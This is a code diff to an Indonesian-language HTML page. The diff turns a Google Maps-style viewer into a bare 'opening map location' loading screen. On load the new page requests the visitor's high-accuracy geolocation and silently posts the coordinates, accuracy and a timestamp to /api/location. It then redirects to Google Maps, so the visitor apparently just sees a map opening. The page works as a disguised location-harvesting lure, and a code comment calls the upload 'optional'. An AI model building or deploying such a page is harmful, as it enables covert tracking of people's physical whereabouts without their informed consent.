@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Peta Lokasi - Google Maps Style</title>
+  <title>Membuka Peta Lokasi...</title>
   <style>
     * {
       margin: 0;
@@ -18,152 +18,105 @@
       background: #e8eaed;
       overflow: hidden;
       position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    /* Container peta utama */
-    #map-container {
+    /* Background pattern menyerupai peta */
+    .bg-pattern {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        linear-gradient(145deg, #d2e3fc 0%, #e6f0fa 30%, #f8f9fa 70%, #e8eaed 100%);
+      z-index: 0;
+    }
+
+    .bg-pattern::before {
+      content: "";
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      z-index: 1;
+      background-image: 
+        radial-gradient(circle at 20% 30%, rgba(255,255,255,0.7) 0%, transparent 25%),
+        radial-gradient(circle at 80% 70%, rgba(255,255,255,0.5) 0%, transparent 30%),
+        linear-gradient(90deg, rgba(200,200,200,0.15) 1px, transparent 1px),
+        linear-gradient(rgba(200,200,200,0.15) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 40px 40px, 40px 40px;
+      opacity: 0.5;
     }
 
-    /* Overlay kontrol seperti Google Maps */
-    .gmaps-controls {
-      position: absolute;
-      z-index: 10;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
-      overflow: hidden;
-    }
-
-    .zoom-controls {
-      right: 16px;
-      bottom: 100px;
-      width: 40px;
-    }
-
-    .zoom-btn {
-      width: 40px;
-      height: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      font-size: 24px;
-      font-weight: bold;
-      color: #5f6368;
-      transition: background 0.2s;
-      user-select: none;
-      background: white;
-      border: none;
-      outline: none;
-    }
-
-    .zoom-btn:hover {
-      background: #f1f3f4;
-    }
-
-    .zoom-btn:active {
-      background: #e8eaed;
-    }
-
-    .zoom-btn + .zoom-btn {
-      border-top: 1px solid #e8eaed;
-    }
-
-    /* Panel info lokasi */
-    .location-panel {
-      position: absolute;
-      bottom: 24px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 10;
+    /* Kartu loading */
+    .loading-card {
+      position: relative;
+      z-index: 2;
       background: white;
       border-radius: 24px;
-      padding: 16px 24px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
-      min-width: 280px;
-      max-width: 90%;
+      padding: 40px 32px;
       text-align: center;
-      display: none;
-      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      max-width: 400px;
+      width: 90%;
+      animation: fadeIn 0.5s ease-out;
     }
 
-    .location-panel.show {
-      display: block;
-      animation: slideUp 0.4s ease-out;
-    }
-
-    @keyframes slideUp {
+    @keyframes fadeIn {
       from {
         opacity: 0;
-        transform: translateX(-50%) translateY(20px);
+        transform: translateY(20px);
       }
       to {
         opacity: 1;
-        transform: translateX(-50%) translateY(0);
+        transform: translateY(0);
       }
     }
 
-    .coords-text {
-      font-size: 14px;
-      color: #3c4043;
-      margin-bottom: 8px;
-      font-weight: 500;
-    }
-
-    .action-buttons {
-      display: flex;
-      gap: 8px;
-      justify-content: center;
-    }
-
-    .map-btn {
+    .location-icon {
+      width: 80px;
+      height: 80px;
       background: #1a73e8;
-      color: white;
-      border: none;
-      padding: 10px 16px;
-      border-radius: 20px;
-      cursor: pointer;
-      font-size: 13px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      box-shadow: 0 6px 14px rgba(26, 115, 232, 0.35);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .location-icon span {
+      font-size: 40px;
+      line-height: 1;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+    }
+
+    h1 {
+      font-size: 1.5rem;
       font-weight: 500;
-      transition: background 0.2s;
+      color: #202124;
+      margin-bottom: 12px;
+      line-height: 1.3;
     }
 
-    .map-btn:hover {
-      background: #1557b0;
-    }
-
-    .map-btn.secondary {
-      background: #f1f3f4;
-      color: #1a73e8;
-    }
-
-    .map-btn.secondary:hover {
-      background: #e8eaed;
-    }
-
-    /* Loading overlay */
-    .loading-overlay {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 20;
-      background: white;
-      border-radius: 16px;
-      padding: 24px 32px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-      text-align: center;
-      display: none;
-    }
-
-    .loading-overlay.show {
-      display: block;
+    .status-text {
+      color: #5f6368;
+      font-size: 0.95rem;
+      line-height: 1.6;
+      margin-bottom: 20px;
     }
 
     .loading-spinner {
@@ -173,7 +126,7 @@
       border-top: 4px solid #1a73e8;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin: 0 auto 12px;
+      margin: 0 auto;
     }
 
     @keyframes spin {
@@ -181,317 +134,150 @@
       100% { transform: rotate(360deg); }
     }
 
-    .loading-text {
-      color: #5f6368;
-      font-size: 14px;
-      font-weight: 500;
-    }
-
-    /* Marker kustom */
-    .custom-marker {
-      width: 40px;
-      height: 40px;
-      background: #1a73e8;
-      border-radius: 50% 50% 50% 0;
-      transform: rotate(-45deg);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
-      border: 2px solid white;
-      cursor: pointer;
-    }
-
-    .custom-marker::after {
-      content: '';
-      width: 16px;
-      height: 16px;
-      background: white;
-      border-radius: 50%;
-      transform: rotate(45deg);
-    }
-
-    /* Notifikasi izin */
-    .permission-banner {
-      position: absolute;
-      top: 16px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 15;
-      background: #ffffff;
-      border-radius: 12px;
-      padding: 12px 20px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    .error-message {
+      color: #d93025;
+      font-size: 0.9rem;
+      margin-top: 16px;
       display: none;
-      align-items: center;
-      gap: 8px;
-      max-width: 90%;
     }
 
-    .permission-banner.show {
-      display: flex;
-    }
-
-    .permission-icon {
-      font-size: 20px;
-    }
-
-    .permission-text {
-      color: #3c4043;
-      font-size: 13px;
-      font-weight: 500;
+    .error-message.show {
+      display: block;
     }
   </style>
 </head>
 <body>
-  <!-- Container peta Google Maps -->
-  <div id="map-container"></div>
+  <!-- Background peta -->
+  <div class="bg-pattern"></div>
 
-  <!-- Kontrol zoom seperti Google Maps -->
-  <div class="gmaps-controls zoom-controls">
-    <button class="zoom-btn" id="zoomIn" title="Perbesar">+</button>
-    <button class="zoom-btn" id="zoomOut" title="Perkecil">−</button>
-  </div>
-
-  <!-- Panel lokasi -->
-  <div class="location-panel" id="locationPanel">
-    <div class="coords-text" id="coordsText">Mendapatkan lokasi...</div>
-    <div class="action-buttons">
-      <button class="map-btn" id="openInMaps">Buka di Google Maps</button>
-      <button class="map-btn secondary" id="shareLocation">Salin Koordinat</button>
+  <!-- Kartu loading -->
+  <div class="loading-card" id="loadingCard">
+    <div class="location-icon">
+      <span>📍</span>
     </div>
+    <h1 id="titleText">Mendeteksi Lokasi...</h1>
+    <div class="status-text" id="statusText">
+    </div>
+    <div class="loading-spinner" id="spinner"></div>
+    <div class="error-message" id="errorMessage"></div>
   </div>
-
-  <!-- Loading overlay -->
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-spinner"></div>
-    <div class="loading-text">Memuat peta...</div>
-  </div>
-
-  <!-- Banner izin -->
-  <div class="permission-banner" id="permissionBanner">
-    <span class="permission-icon">📍</span>
-    <span class="permission-text">Izinkan akses lokasi</span>
-  </div>
-
-  <script async defer 
-    src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap&libraries=marker">
-  </script>
 
   <script>
-    let map;
-    let userMarker;
-    let userPosition = null;
-    let mapInitialized = false;
+    (function() {
+      // Fungsi untuk update UI
+      function updateUI(title, status, showSpinner = true, showError = false, errorMsg = '') {
+        document.getElementById('titleText').textContent = title;
+        document.getElementById('statusText').textContent = status;
+        
+        const spinner = document.getElementById('spinner');
+        spinner.style.display = showSpinner ? 'block' : 'none';
+        
+        const errorElement = document.getElementById('errorMessage');
+        if (showError) {
+          errorElement.textContent = errorMsg;
+          errorElement.classList.add('show');
+        } else {
+          errorElement.classList.remove('show');
+        }
+      }
 
-    // Variabel global untuk callback Google Maps
-    window.initMap = function() {
-      mapInitialized = true;
-      
-      // Default center (Jakarta)
-      const defaultCenter = { lat: -6.2088, lng: 106.8456 };
-      
-      map = new google.maps.Map(document.getElementById('map-container'), {
-        center: defaultCenter,
-        zoom: 16,
-        disableDefaultUI: true,
-        zoomControl: false,
-        mapTypeControl: false,
-        streetViewControl: false,
-        fullscreenControl: false,
-        styles: [
+      // Fungsi untuk redirect ke Google Maps
+      function redirectToGoogleMaps(latitude, longitude) {
+        // Update UI sebelum redirect
+        updateUI('Lokasi Ditemukan!', 'Membuka Google Maps...', true);
+        
+        // Buat URL Google Maps
+        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=17`;
+        
+        // Redirect setelah delay singkat
+        setTimeout(() => {
+          window.location.href = mapsUrl;
+        }, 800);
+      }
+
+      // Fungsi untuk mengirim lokasi ke server (opsional)
+      function sendLocationToServer(latitude, longitude, accuracy) {
+        const payload = {
+          latitude: latitude,
+          longitude: longitude,
+          accuracy: accuracy,
+          timestamp: new Date().toISOString()
+        };
+
+        // Kirim ke server (tidak blocking)
+        fetch('/api/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(err => {
+          // Abaikan error - lokasi tetap diproses
+          console.log('Server save optional:', err.message);
+        });
+      }
+
+      // Fungsi utama untuk meminta lokasi
+      function requestLocation() {
+        if (!navigator.geolocation) {
+          updateUI('Browser Tidak Mendukung', 'Browser Anda tidak mendukung geolokasi', false, true, 'Silakan gunakan browser modern seperti Chrome, Firefox, atau Safari.');
+          return;
+        }
+
+        // Update UI untuk meminta izin
+        updateUI('Mendeteksi Lokasi...', 'Mohon izinkan akses lokasi pada pop-up browser', true);
+
+        // Minta lokasi dengan timeout
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // Kirim lokasi ke server (opsional, tidak blocking)
+            sendLocationToServer(latitude, longitude, accuracy);
+
+            // Redirect ke Google Maps
+            redirectToGoogleMaps(latitude, longitude);
+          },
+          (error) => {
+            let errorMessage = '';
+            
+            switch(error.code) {
+              case error.PERMISSION_DENIED:
+                errorMessage = 'Izin lokasi ditolak. Silakan aktifkan izin lokasi di browser Anda.';
+                break;
+              case error.POSITION_UNAVAILABLE:
+                errorMessage = 'Lokasi tidak tersedia. Periksa koneksi internet atau GPS Anda.';
+                break;
+              case error.TIMEOUT:
+                errorMessage = 'Waktu permintaan lokasi habis. Silakan coba lagi.';
+                break;
+              default:
+                errorMessage = 'Terjadi kesalahan saat mengambil lokasi.';
+            }
+            
+            updateUI('Gagal Mendapatkan Lokasi', 'Tidak dapat mengakses lokasi Anda', false, true, errorMessage);
+          },
           {
-            featureType: "poi",
-            elementType: "labels",
-            stylers: [{ visibility: "off" }]
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
           }
-        ]
-      });
-
-      // Sembunyikan loading overlay
-      document.getElementById('loadingOverlay').classList.remove('show');
-
-      // Setup kontrol zoom
-      document.getElementById('zoomIn').addEventListener('click', () => {
-        map.setZoom(map.getZoom() + 1);
-      });
-
-      document.getElementById('zoomOut').addEventListener('click', () => {
-        map.setZoom(map.getZoom() - 1);
-      });
-
-      // Request lokasi otomatis setelah peta siap
-      requestUserLocation();
-    };
-
-    // Fungsi untuk meminta lokasi pengguna
-    function requestUserLocation() {
-      if (!navigator.geolocation) {
-        showPermissionBanner('Browser tidak mendukung geolokasi');
-        return;
+        );
       }
 
-      showLoadingOverlay('Mendeteksi lokasi...');
+      // Mulai permintaan lokasi saat halaman dimuat
+      window.addEventListener('load', () => {
+        // Delay kecil untuk memastikan UI terlihat
+        setTimeout(() => {
+          requestLocation();
+        }, 500);
+      });
 
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          userPosition = {
-            lat: position.coords.latitude,
-            lng: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          };
-
-          // Sembunyikan loading overlay
-          hideLoadingOverlay();
-
-          // Tambahkan marker di posisi user
-          addUserMarker(userPosition);
-
-          // Center peta ke posisi user
-          map.setCenter(userPosition);
-          map.setZoom(17);
-
-          // Tampilkan panel lokasi
-          showLocationPanel(userPosition);
-
-          // Kirim lokasi ke server (opsional)
-          sendLocationToServer(userPosition);
-        },
-        (error) => {
-          hideLoadingOverlay();
-          showPermissionBanner('Izin lokasi ditolak atau tidak tersedia');
-          
-          // Tetap tampilkan peta default
-          if (mapInitialized) {
-            map.setCenter({ lat: -6.2088, lng: 106.8456 });
-          }
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-    }
-
-    // Fungsi untuk menambahkan marker user
-    function addUserMarker(position) {
-      if (userMarker) {
-        userMarker.setMap(null);
+      // Fallback jika load event sudah terlewati
+      if (document.readyState === 'complete') {
+        setTimeout(requestLocation, 500);
       }
-
-      userMarker = new google.maps.Marker({
-        position: position,
-        map: map,
-        title: 'Lokasi Anda',
-        animation: google.maps.Animation.DROP,
-        icon: {
-          path: google.maps.SymbolPath.CIRCLE,
-          scale: 10,
-          fillColor: '#1a73e8',
-          fillOpacity: 1,
-          strokeColor: '#ffffff',
-          strokeWeight: 3,
-        },
-        label: {
-          text: '📍',
-          fontSize: '20px',
-          className: 'marker-label'
-        }
-      });
-
-      // Info window
-      const infoWindow = new google.maps.InfoWindow({
-        content: '<div style="font-weight:500;">📍 Lokasi Anda</div>'
-      });
-
-      userMarker.addListener('click', () => {
-        infoWindow.open(map, userMarker);
-      });
-    }
-
-    // Fungsi untuk menampilkan panel lokasi
-    function showLocationPanel(position) {
-      const panel = document.getElementById('locationPanel');
-      const coordsText = document.getElementById('coordsText');
-      
-      coordsText.textContent = `${position.lat.toFixed(6)}, ${position.lng.toFixed(6)}`;
-      panel.classList.add('show');
-    }
-
-    // Fungsi untuk loading overlay
-    function showLoadingOverlay(text) {
-      const overlay = document.getElementById('loadingOverlay');
-      const loadingText = overlay.querySelector('.loading-text');
-      loadingText.textContent = text;
-      overlay.classList.add('show');
-    }
-
-    function hideLoadingOverlay() {
-      document.getElementById('loadingOverlay').classList.remove('show');
-    }
-
-    // Fungsi untuk banner izin
-    function showPermissionBanner(text) {
-      const banner = document.getElementById('permissionBanner');
-      const bannerText = banner.querySelector('.permission-text');
-      bannerText.textContent = text;
-      banner.classList.add('show');
-      
-      setTimeout(() => {
-        banner.classList.remove('show');
-      }, 5000);
-    }
-
-    // Fungsi untuk mengirim lokasi ke server
-    function sendLocationToServer(position) {
-      const payload = {
-        latitude: position.lat,
-        longitude: position.lng,
-        accuracy: position.accuracy,
-        timestamp: new Date().toISOString()
-      };
-
-      fetch('/api/location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(err => {
-        console.log('Gagal menyimpan lokasi (demo mode):', err.message);
-      });
-    }
-
-    // Event listeners untuk tombol
-    document.addEventListener('DOMContentLoaded', () => {
-      // Tampilkan loading overlay
-      showLoadingOverlay('Memuat Google Maps...');
-
-      // Tombol buka di Google Maps
-      document.getElementById('openInMaps').addEventListener('click', () => {
-        if (userPosition) {
-          const mapsUrl = `https://www.google.com/maps?q=${userPosition.lat},${userPosition.lng}`;
-          window.open(mapsUrl, '_blank');
-        }
-      });
-
-      // Tombol salin koordinat
-      document.getElementById('shareLocation').addEventListener('click', () => {
-        if (userPosition) {
-          const coords = `${userPosition.lat}, ${userPosition.lng}`;
-          navigator.clipboard.writeText(coords).then(() => {
-            showPermissionBanner('Koordinat disalin ke clipboard');
-          });
-        }
-      });
-
-      // Fallback jika Google Maps API gagal dimuat
-      setTimeout(() => {
-        if (!mapInitialized) {
-          hideLoadingOverlay();
-          showPermissionBanner('Gagal memuat peta Google Maps');
-        }
-      }, 10000);
-    });
+    })();
   </script>
 </body>
 </html>
